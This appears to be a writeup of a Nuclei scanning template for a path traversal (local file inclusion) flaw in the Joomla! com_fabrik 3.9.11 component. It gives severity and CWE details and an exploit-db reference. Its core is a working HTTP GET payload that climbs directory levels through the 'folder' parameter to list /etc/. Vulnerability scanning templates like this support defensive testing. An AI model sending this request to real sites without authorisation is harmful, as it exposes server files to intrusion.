# Nuclei Template: Joomla! com_fabrik 3.9.11 - Local File Inclusion
**Template ID:** joomla-com-fabrik-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`joomla-com-fabrik-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Joomla! com_fabrik 3.9.11 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../etc/
```

## References
- https://www.exploit-db.com/exploits/48263
